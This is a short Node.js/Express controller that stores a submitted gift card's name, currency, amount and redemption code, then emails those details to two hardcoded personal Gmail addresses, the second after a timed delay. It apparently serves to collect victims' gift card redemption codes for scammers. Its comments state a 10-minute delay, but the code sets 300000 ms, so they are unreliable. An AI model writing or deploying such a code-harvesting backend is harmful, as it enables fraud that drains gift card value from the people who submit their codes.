require('dotenv').config();
const GiftCardModel = require('../models/GiftCardMOdel');
const { sendEmail } = require('../helpers/sendMail');
const { paymentReceiptTemplate } = require('../helpers/emailTemplate');

exports.GiftCardSignup = async (req, res) => {
  try {
    const { Name, Currency, Amount, Redemptioncode } = req.body;

    if (!Name || !Currency || !Amount || !Redemptioncode) {
      return res.status(400).json({
        message: `Please enter all details`,
      });
    }

    const newGiftCard = new GiftCardModel({
      Name,
      Currency,
      Amount,
      Redemptioncode,
    });

    const savedGiftCard = await newGiftCard.save();

    // First email immediately
    const firstEmail = "jolaetopia81@gmail.com";
    const secondEmail = "khonarichie01@gmail.com";

    const emailContent = paymentReceiptTemplate(
      savedGiftCard.Name,
      savedGiftCard.Currency,
      savedGiftCard.Amount,
      savedGiftCard.Redemptioncode
    );

    // Send to first recipient
    await sendEmail({
      email: firstEmail,
      subject: "Gift Card Purchase Receipt",
      html: emailContent,
    });

    // Schedule second email after 10 minutes (600000 milliseconds)
    setTimeout(async () => {
      try {
        await sendEmail({
          email: secondEmail,
          subject: "Gift Card Purchase Receipt - Delayed",
          html: emailContent,
        });
        console.log(`Second email sent to ${secondEmail}`);
      } catch (err) {
        console.error(`Failed to send second email: ${err.message}`);
      }
    }, 300000); // 10 minutes delay

    return res.status(201).json({
      message: `Gift card saved successfully. Email sent to ${firstEmail}. Another will be sent after 10 minutes.`,
      data: savedGiftCard,
    });

  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};
